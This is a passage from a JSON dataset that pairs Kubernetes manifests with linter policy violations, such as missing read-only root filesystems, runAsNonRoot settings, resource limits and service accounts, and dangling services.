    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: pgadmin4-svc\nspec:\n  selector:\n    app: pgadmin4\n  type: NodePort\n  ports:\n  - protocol: TCP\n    port: 80\n    nodePort: 5050\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:pgadmin4])"
  },
  {
    "id": "7133",
    "manifest_path": "data/manifests/the_stack_sample/sample_2593.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: metaclusterssaver\nspec:\n  containers:\n  - image: 129.114.111.193:5000/metaclusters_saver:v1\n    name: metaclusterssaver\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"metaclusterssaver\" does not have a read-only root file system"
  },
  {
    "id": "7134",
    "manifest_path": "data/manifests/the_stack_sample/sample_2593.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: metaclusterssaver\nspec:\n  containers:\n  - image: 129.114.111.193:5000/metaclusters_saver:v1\n    name: metaclusterssaver\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"metaclusterssaver\" is not set to runAsNonRoot"
  },
  {
    "id": "7135",
    "manifest_path": "data/manifests/the_stack_sample/sample_2593.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: metaclusterssaver\nspec:\n  containers:\n  - image: 129.114.111.193:5000/metaclusters_saver:v1\n    name: metaclusterssaver\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"metaclusterssaver\" has cpu request 0"
  },
  {
    "id": "7136",
    "manifest_path": "data/manifests/the_stack_sample/sample_2593.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: metaclusterssaver\nspec:\n  containers:\n  - image: 129.114.111.193:5000/metaclusters_saver:v1\n    name: metaclusterssaver\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"metaclusterssaver\" has memory limit 0"
  },
  {
    "id": "7137",
    "manifest_path": "data/manifests/the_stack_sample/sample_2594.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: mongo-device-auth\nspec:\n  ports:\n  - port: 27017\n    protocol: TCP\n  selector:\n    service: mender-mongo-device-auth\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[service:mender-mongo-device-auth])"
  },
  {
    "id": "7138",
    "manifest_path": "data/manifests/the_stack_sample/sample_2595.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-first-3\n  labels:\n    app: myapp\n    tier: frontend\nspec:\n  containers:\n  - name: myapp\n    image: ikubernetes/myapp:v1\n    imagePullPolicy: IfNotPresent\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"myapp\" does not have a read-only root file system"
  },
  {
    "id": "7139",
    "manifest_path": "data/manifests/the_stack_sample/sample_2595.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-first-3\n  labels:\n    app: myapp\n    tier: frontend\nspec:\n  containers:\n  - name: myapp\n    image: ikubernetes/myapp:v1\n    imagePullPolicy: IfNotPresent\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"myapp\" is not set to runAsNonRoot"
  },
  {
    "id": "7140",
    "manifest_path": "data/manifests/the_stack_sample/sample_2595.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-first-3\n  labels:\n    app: myapp\n    tier: frontend\nspec:\n  containers:\n  - name: myapp\n    image: ikubernetes/myapp:v1\n    imagePullPolicy: IfNotPresent\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"myapp\" has cpu request 0"
  },
  {
    "id": "7141",
    "manifest_path": "data/manifests/the_stack_sample/sample_2595.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-first-3\n  labels:\n    app: myapp\n    tier: frontend\nspec:\n  containers:\n  - name: myapp\n    image: ikubernetes/myapp:v1\n    imagePullPolicy: IfNotPresent\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"myapp\" has memory limit 0"
  },
  {
    "id": "7142",
    "manifest_path": "data/manifests/the_stack_sample/sample_2603.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: exome-results-browsers\n  labels:\n    service: exome-results-browsers\nspec:\n  type: NodePort\n  selector:\n    name: exome-results-browsers\n  ports:\n  - port: 80\n    targetPort: 8000\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[name:exome-results-browsers])"
  },
  {
    "id": "7143",
    "manifest_path": "data/manifests/the_stack_sample/sample_2607.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7067\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7144",
    "manifest_path": "data/manifests/the_stack_sample/sample_2607.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7067\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "7145",
    "manifest_path": "data/manifests/the_stack_sample/sample_2607.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7067\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "7146",
    "manifest_path": "data/manifests/the_stack_sample/sample_2607.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7067\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "7147",
    "manifest_path": "data/manifests/the_stack_sample/sample_2607.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7067\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "7148",
    "manifest_path": "data/manifests/the_stack_sample/sample_2610.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: prow-pipeline\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow-pipeline\n  template:\n    metadata:\n      labels:\n        app: prow-pipeline\n    spec:\n      serviceAccountName: prow-pipeline\n      containers:\n      - name: pipeline\n        image: gcr.io/k8s-prow/pipeline:v20220305-a9a1fd8e47\n        args:\n        - --all-contexts\n        - --config=/etc/prow-config/config.yaml\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - mountPath: /etc/prow-config\n          name: prow-config\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: prow-config\n        configMap:\n          name: config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"pipeline\" does not have a read-only root file system"
  },
  {
    "id": "7149",
    "manifest_path": "data/manifests/the_stack_sample/sample_2610.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: prow-pipeline\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow-pipeline\n  template:\n    metadata:\n      labels:\n        app: prow-pipeline\n    spec:\n      serviceAccountName: prow-pipeline\n      containers:\n      - name: pipeline\n        image: gcr.io/k8s-prow/pipeline:v20220305-a9a1fd8e47\n        args:\n        - --all-contexts\n        - --config=/etc/prow-config/config.yaml\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - mountPath: /etc/prow-config\n          name: prow-config\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: prow-config\n        configMap:\n          name: config\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"prow-pipeline\" not found"
  },
  {
    "id": "7150",
    "manifest_path": "data/manifests/the_stack_sample/sample_2610.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: prow-pipeline\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow-pipeline\n  template:\n    metadata:\n      labels:\n        app: prow-pipeline\n    spec:\n      serviceAccountName: prow-pipeline\n      containers:\n      - name: pipeline\n        image: gcr.io/k8s-prow/pipeline:v20220305-a9a1fd8e47\n        args:\n        - --all-contexts\n        - --config=/etc/prow-config/config.yaml\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - mountPath: /etc/prow-config\n          name: prow-config\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: prow-config\n        configMap:\n          name: config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"pipeline\" is not set to runAsNonRoot"
  },
  {
    "id": "7151",
    "manifest_path": "data/manifests/the_stack_sample/sample_2610.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: prow-pipeline\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow-pipeline\n  template:\n    metadata:\n      labels:\n        app: prow-pipeline\n    spec:\n      serviceAccountName: prow-pipeline\n      containers:\n      - name: pipeline\n        image: gcr.io/k8s-prow/pipeline:v20220305-a9a1fd8e47\n        args:\n        - --all-contexts\n        - --config=/etc/prow-config/config.yaml\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - mountPath: /etc/prow-config\n          name: prow-config\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: prow-config\n        configMap:\n          name: config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"pipeline\" has cpu request 0"
  },
  {
    "id": "7152",
    "manifest_path": "data/manifests/the_stack_sample/sample_2610.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: prow-pipeline\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow-pipeline\n  template:\n    metadata:\n      labels:\n        app: prow-pipeline\n    spec:\n      serviceAccountName: prow-pipeline\n      containers:\n      - name: pipeline\n        image: gcr.io/k8s-prow/pipeline:v20220305-a9a1fd8e47\n        args:\n        - --all-contexts\n        - --config=/etc/prow-config/config.yaml\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - mountPath: /etc/prow-config\n          name: prow-config\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: prow-config\n        configMap:\n          name: config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"pipeline\" has memory limit 0"
  },
  {
    "id": "7153",
    "manifest_path": "data/manifests/the_stack_sample/sample_2611.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app: node-exporter\n    version: 0.18.1\n  name: node-exporter\n  namespace: monitor\nspec:\n  clusterIP: None\n  ports:\n  - name: scrape\n    port: 9100\n    targetPort: scrape\n  selector:\n    app: node-exporter\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:node-exporter])"
  },
  {
    "id": "7154",
    "manifest_path": "data/manifests/the_stack_sample/sample_2613.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: crier\n  labels:\n    app: crier\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crier\n  template:\n    metadata:\n      labels:\n        app: crier\n    spec:\n      serviceAccountName: crier\n      containers:\n      - name: crier\n        image: gcr.io/k8s-prow/crier:v20210617-c78e5916da\n        env:\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /etc/credentials/service-account.json\n        args:\n        - --blob-storage-workers=1\n        - --config-path=/etc/config/config.yaml\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --github-workers=5\n        - --job-config-path=/etc/job-config\n        - --kubeconfig=/etc/kubeconfig/config\n        - --kubernetes-blob-storage-workers=1\n        - --pubsub-workers=5\n        - --slack-token-file=/etc/slack/token\n        - --slack-workers=1\n        - --gcs-credentials-file=/etc/credentials/service-account.json\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: slack\n          mountPath: /etc/slack\n          readOnly: true\n        - name: gcs-service-account\n          mountPath: /etc/credentials\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: workload-clusters-kubeconfig\n      - name: gcs-service-account\n        secret:\n          secretName: sa-crier\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"crier\" does not have a read-only root file system"
  },
  {
    "id": "7155",
    "manifest_path": "data/manifests/the_stack_sample/sample_2613.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: crier\n  labels:\n    app: crier\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crier\n  template:\n    metadata:\n      labels:\n        app: crier\n    spec:\n      serviceAccountName: crier\n      containers:\n      - name: crier\n        image: gcr.io/k8s-prow/crier:v20210617-c78e5916da\n        env:\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /etc/credentials/service-account.json\n        args:\n        - --blob-storage-workers=1\n        - --config-path=/etc/config/config.yaml\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --github-workers=5\n        - --job-config-path=/etc/job-config\n        - --kubeconfig=/etc/kubeconfig/config\n        - --kubernetes-blob-storage-workers=1\n        - --pubsub-workers=5\n        - --slack-token-file=/etc/slack/token\n        - --slack-workers=1\n        - --gcs-credentials-file=/etc/credentials/service-account.json\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: slack\n          mountPath: /etc/slack\n          readOnly: true\n        - name: gcs-service-account\n          mountPath: /etc/credentials\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: workload-clusters-kubeconfig\n      - name: gcs-service-account\n        secret:\n          secretName: sa-crier\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"crier\" not found"
  },
  {
    "id": "7156",
    "manifest_path": "data/manifests/the_stack_sample/sample_2613.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: crier\n  labels:\n    app: crier\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crier\n  template:\n    metadata:\n      labels:\n        app: crier\n    spec:\n      serviceAccountName: crier\n      containers:\n      - name: crier\n        image: gcr.io/k8s-prow/crier:v20210617-c78e5916da\n        env:\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /etc/credentials/service-account.json\n        args:\n        - --blob-storage-workers=1\n        - --config-path=/etc/config/config.yaml\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --github-workers=5\n        - --job-config-path=/etc/job-config\n        - --kubeconfig=/etc/kubeconfig/config\n        - --kubernetes-blob-storage-workers=1\n        - --pubsub-workers=5\n        - --slack-token-file=/etc/slack/token\n        - --slack-workers=1\n        - --gcs-credentials-file=/etc/credentials/service-account.json\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: slack\n          mountPath: /etc/slack\n          readOnly: true\n        - name: gcs-service-account\n          mountPath: /etc/credentials\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: workload-clusters-kubeconfig\n      - name: gcs-service-account\n        secret:\n          secretName: sa-crier\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"crier\" is not set to runAsNonRoot"
  },
  {
    "id": "7157",
    "manifest_path": "data/manifests/the_stack_sample/sample_2613.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: crier\n  labels:\n    app: crier\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crier\n  template:\n    metadata:\n      labels:\n        app: crier\n    spec:\n      serviceAccountName: crier\n      containers:\n      - name: crier\n        image: gcr.io/k8s-prow/crier:v20210617-c78e5916da\n        env:\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /etc/credentials/service-account.json\n        args:\n        - --blob-storage-workers=1\n        - --config-path=/etc/config/config.yaml\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --github-workers=5\n        - --job-config-path=/etc/job-config\n        - --kubeconfig=/etc/kubeconfig/config\n        - --kubernetes-blob-storage-workers=1\n        - --pubsub-workers=5\n        - --slack-token-file=/etc/slack/token\n        - --slack-workers=1\n        - --gcs-credentials-file=/etc/credentials/service-account.json\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: slack\n          mountPath: /etc/slack\n          readOnly: true\n        - name: gcs-service-account\n          mountPath: /etc/credentials\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: workload-clusters-kubeconfig\n      - name: gcs-service-account\n        secret:\n          secretName: sa-crier\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"crier\" has cpu request 0"
  },
  {
    "id": "7158",
    "manifest_path": "data/manifests/the_stack_sample/sample_2613.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: crier\n  labels:\n    app: crier\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: crier\n  template:\n    metadata:\n      labels:\n        app: crier\n    spec:\n      serviceAccountName: crier\n      containers:\n      - name: crier\n        image: gcr.io/k8s-prow/crier:v20210617-c78e5916da\n        env:\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /etc/credentials/service-account.json\n        args:\n        - --blob-storage-workers=1\n        - --config-path=/etc/config/config.yaml\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --github-workers=5\n        - --job-config-path=/etc/job-config\n        - --kubeconfig=/etc/kubeconfig/config\n        - --kubernetes-blob-storage-workers=1\n        - --pubsub-workers=5\n        - --slack-token-file=/etc/slack/token\n        - --slack-workers=1\n        - --gcs-credentials-file=/etc/credentials/service-account.json\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: slack\n          mountPath: /etc/slack\n          readOnly: true\n        - name: gcs-service-account\n          mountPath: /etc/credentials\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: workload-clusters-kubeconfig\n      - name: gcs-service-account\n        secret:\n          secretName: sa-crier\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"crier\" has memory limit 0"
  },
  {
    "id": "7159",
    "manifest_path": "data/manifests/the_stack_sample/sample_2616.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: kritis-server-global-whitelist\nspec:\n  containers:\n  - name: kritis-server-global-whitelist\n    image: gcr.io/kritis-project/kritis-server:global-whitelist-int-test\n    command:\n    - echo\n    - hi\n    ports:\n    - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"kritis-server-global-whitelist\" does not have a read-only root file system"
  },
  {
    "id": "7160",
    "manifest_path": "data/manifests/the_stack_sample/sample_2616.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: kritis-server-global-whitelist\nspec:\n  containers:\n  - name: kritis-server-global-whitelist\n    image: gcr.io/kritis-project/kritis-server:global-whitelist-int-test\n    command:\n    - echo\n    - hi\n    ports:\n    - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"kritis-server-global-whitelist\" is not set to runAsNonRoot"
  },
  {
    "id": "7161",
    "manifest_path": "data/manifests/the_stack_sample/sample_2616.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: kritis-server-global-whitelist\nspec:\n  containers:\n  - name: kritis-server-global-whitelist\n    image: gcr.io/kritis-project/kritis-server:global-whitelist-int-test\n    command:\n    - echo\n    - hi\n    ports:\n    - containerPort: 80\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"kritis-server-global-whitelist\" has cpu request 0"
  },
  {
    "id": "7162",
    "manifest_path": "data/manifests/the_stack_sample/sample_2616.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: kritis-server-global-whitelist\nspec:\n  containers:\n  - name: kritis-server-global-whitelist\n    image: gcr.io/kritis-project/kritis-server:global-whitelist-int-test\n    command:\n    - echo\n    - hi\n    ports:\n    - containerPort: 80\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"kritis-server-global-whitelist\" has memory limit 0"
  },
  {
    "id": "7163",
    "manifest_path": "data/manifests/the_stack_sample/sample_2617.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: workshopgi\n  namespace: ernst\nspec:\n  selector:\n    app: workshopgi\n  type: LoadBalancer\n  ports:\n  - name: proxy\n    port: 80\n    targetPort: 5678\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:workshopgi])"
  },
  {
    "id": "7164",
    "manifest_path": "data/manifests/the_stack_sample/sample_2618.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: myapp-service\nspec:\n  type: NodePort\n  ports:\n  - targetPort: 80\n    port: 80\n    nodePort: 30080\n  selector:\n    app: myapp\n    type: front-end\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:myapp type:front-end])"
  },
  {
    "id": "7165",
    "manifest_path": "data/manifests/the_stack_sample/sample_2623.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-5705\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7166",
    "manifest_path": "data/manifests/the_stack_sample/sample_2623.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-5705\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "7167",
    "manifest_path": "data/manifests/the_stack_sample/sample_2623.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-5705\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "7168",
    "manifest_path": "data/manifests/the_stack_sample/sample_2623.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-5705\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "7169",
    "manifest_path": "data/manifests/the_stack_sample/sample_2623.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-5705\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "7170",
    "manifest_path": "data/manifests/the_stack_sample/sample_2624.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: guestbook-service-v1\n  labels:\n    app: guestbook-service\n    version: '1.0'\n    visualize: 'true'\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: guestbook-service\n      version: '1.0'\n      serving: 'true'\n  template:\n    metadata:\n      labels:\n        app: guestbook-service\n        serving: 'true'\n        version: '1.0'\n        visualize: 'true'\n    spec:\n      containers:\n      - name: guestbook-service\n        image: saturnism/guestbook-service-istio:1.0\n        livenessProbe:\n          initialDelaySeconds: 90\n          httpGet:\n            path: /actuator/health\n            port: 8080\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8080\n        ports:\n        - containerPort: 8080\n          name: http\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "7171",
    "manifest_path": "data/manifests/the_stack_sample/sample_2624.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: guestbook-service-v1\n  labels:\n    app: guestbook-service\n    version: '1.0'\n    visualize: 'true'\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: guestbook-service\n      version: '1.0'\n      serving: 'true'\n  template:\n    metadata:\n      labels:\n        app: guestbook-service\n        serving: 'true'\n        version: '1.0'\n        visualize: 'true'\n    spec:\n      containers:\n      - name: guestbook-service\n        image: saturnism/guestbook-service-istio:1.0\n        livenessProbe:\n          initialDelaySeconds: 90\n          httpGet:\n            path: /actuator/health\n            port: 8080\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8080\n        ports:\n        - containerPort: 8080\n          name: http\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"guestbook-service\" does not have a read-only root file system"
  },
  {
    "id": "7172",
    "manifest_path": "data/manifests/the_stack_sample/sample_2624.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: guestbook-service-v1\n  labels:\n    app: guestbook-service\n    version: '1.0'\n    visualize: 'true'\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: guestbook-service\n      version: '1.0'\n      serving: 'true'\n  template:\n    metadata:\n      labels:\n        app: guestbook-service\n        serving: 'true'\n        version: '1.0'\n        visualize: 'true'\n    spec:\n      containers:\n      - name: guestbook-service\n        image: saturnism/guestbook-service-istio:1.0\n        livenessProbe:\n          initialDelaySeconds: 90\n          httpGet:\n            path: /actuator/health\n            port: 8080\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8080\n        ports:\n        - containerPort: 8080\n          name: http\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"guestbook-service\" is not set to runAsNonRoot"
  },
  {
    "id": "7173",
    "manifest_path": "data/manifests/the_stack_sample/sample_2624.yaml",
